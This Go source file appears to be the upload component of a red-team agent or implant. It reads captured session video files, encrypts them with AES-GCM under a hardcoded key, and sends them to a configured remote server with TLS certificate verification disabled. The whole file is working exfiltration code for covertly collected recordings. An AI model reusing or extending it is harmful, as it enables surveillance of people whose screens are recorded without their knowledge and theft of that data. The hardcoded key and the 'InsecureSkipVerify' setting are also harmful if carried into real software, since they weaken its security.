package recorder

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/tls"
	"encoding/base64"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"github.com/red-team/agent/config"
)

const (
	encryptionKey = "redteam2024!@#$%^&*()_+-=[]{}|;':\",./<>?"
	uploadEndpoint = "/api/videos/upload"
)

type Uploader struct {
	cfg *config.Config
}

func NewUploader(cfg *config.Config) *Uploader {
	return &Uploader{cfg: cfg}
}

func (u *Uploader) UploadRecording(filePath string) error {
	data, err := os.ReadFile(filePath)
	if err != nil {
		return fmt.Errorf("读取文件失败: %v", err)
	}
	
	encrypted, nonce := encrypt(data)
	
	sessionID := filepath.Base(filePath)
	sessionID = sessionID[:len(sessionID)-len(".mp4")]
	
	clientID := u.cfg.ClientID
	
	// 计算视频时长
	duration := getVideoDuration(filePath)
	
	log.Printf("[Uploader] 准备上传录制: %s, 大小: %d bytes, 时长: %.1f秒", sessionID, len(encrypted), duration)
	
	return u.sendToServer(encrypted, nonce, sessionID, clientID, duration)
}

// getVideoDuration 使用 ffprobe 获取视频时长（秒）
func getVideoDuration(filePath string) float64 {
	cmd := exec.Command("ffprobe", "-v", "error", "-show_entries", "format=duration", "-of", "default=noprint_wrappers=1:nokey=1", filePath)
	output, err := cmd.Output()
	if err != nil {
		log.Printf("[Uploader] 获取视频时长失败: %v", err)
		return 0
	}
	
	duration, err := strconv.ParseFloat(strings.TrimSpace(string(output)), 64)
	if err != nil {
		log.Printf("[Uploader] 解析视频时长失败: %v", err)
		return 0
	}
	
	return duration
}

func encrypt(data []byte) ([]byte, []byte) {
	key := []byte(encryptionKey[:32])
	
	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err)
	}
	
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		panic(err)
	}
	
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		panic(err)
	}
	
	return gcm.Seal(nil, nonce, data, nil), nonce
}

func decrypt(encrypted []byte, nonce []byte) []byte {
	key := []byte(encryptionKey[:32])
	
	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err)
	}
	
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		panic(err)
	}
	
	data, err := gcm.Open(nil, nonce, encrypted, nil)
	if err != nil {
		panic(err)
	}
	
	return data
}

func (u *Uploader) sendToServer(encrypted []byte, nonce []byte, sessionID string, clientID string, duration float64) error {
	boundary := "boundary" + fmt.Sprintf("%d", time.Now().UnixNano())
	
	var buf bytes.Buffer
	buf.WriteString(fmt.Sprintf("--%s\r\n", boundary))
	buf.WriteString("Content-Disposition: form-data; name=\"client_id\"\r\n\r\n")
	buf.WriteString(clientID + "\r\n")
	
	buf.WriteString(fmt.Sprintf("--%s\r\n", boundary))
	buf.WriteString("Content-Disposition: form-data; name=\"session_id\"\r\n\r\n")
	buf.WriteString(sessionID + "\r\n")
	
	buf.WriteString(fmt.Sprintf("--%s\r\n", boundary))
	buf.WriteString("Content-Disposition: form-data; name=\"nonce\"\r\n\r\n")
	buf.WriteString(base64.StdEncoding.EncodeToString(nonce) + "\r\n")
	
	buf.WriteString(fmt.Sprintf("--%s\r\n", boundary))
	buf.WriteString("Content-Disposition: form-data; name=\"duration\"\r\n\r\n")
	buf.WriteString(fmt.Sprintf("%.1f", duration) + "\r\n")
	
	buf.WriteString(fmt.Sprintf("--%s\r\n", boundary))
	buf.WriteString(fmt.Sprintf("Content-Disposition: form-data; name=\"video\"; filename=\"%s.mp4.enc\"\r\n", sessionID))
	buf.WriteString("Content-Type: application/octet-stream\r\n\r\n")
	buf.Write(encrypted)
	buf.WriteString("\r\n")
	
	buf.WriteString(fmt.Sprintf("--%s--\r\n", boundary))
	
	url := u.cfg.ServerURL + uploadEndpoint
	req, err := http.NewRequest("POST", url, &buf)
	if err != nil {
		return fmt.Errorf("创建请求失败: %v", err)
	}
	
	req.Header.Set("Content-Type", "multipart/form-data; boundary="+boundary)
	
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Timeout: 30 * time.Second, Transport: tr}
	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("发送请求失败: %v", err)
	}
	defer resp.Body.Close()
	
	if resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("服务器返回错误: %d - %s", resp.StatusCode, string(body))
	}
	
	log.Printf("[Uploader] 上传成功: %s", sessionID)
	return nil
}
